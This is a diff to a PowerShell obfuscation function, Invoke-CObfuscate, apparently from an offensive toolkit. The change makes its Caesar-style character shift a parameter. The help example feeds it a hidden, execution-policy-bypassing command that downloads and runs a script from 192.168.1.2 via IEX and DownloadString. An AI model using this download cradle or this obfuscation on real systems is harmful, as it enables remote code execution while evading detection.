@@ -17,9 +17,13 @@ Transforms every character to a ceasar shifted number following it's ASCII code
 
 Specifies the payload to obfuscate
 
+.PARAMETER Shift
+
+Specifies the shift to apply
+
 .EXAMPLE
 
-C:\PS> Invoke-CObfuscate -Payload "PowerShell -exec Bypass -nop -w hidden -c IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.2/f.txt'))"
+C:\PS> Invoke-CObfuscate -Shift 17 -Payload "PowerShell -exec Bypass -nop -w hidden -c IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.2/f.txt'))"
 
 .LINK
 https://github.com/mlniang/Mist/Powershell
@@ -29,13 +33,17 @@ https://github.com/mlniang/Mist/Powershell
     param(
         [ValidateNotNullOrEmpty()]
         [String]
-        $Payload
+        $Payload,
+
+        [ValidateNotNullOrEmpty()]
+        [UInt32]
+        $Shift
     )
 
     $output = ""
 
     $Payload.ToCharArray() | %{
-        [string]$c = [byte][char]$_ + 17
+        [string]$c = [byte][char]$_ + $Shift
         if($c.Length -eq 1)
         {
             $c = [string]"00" + $c
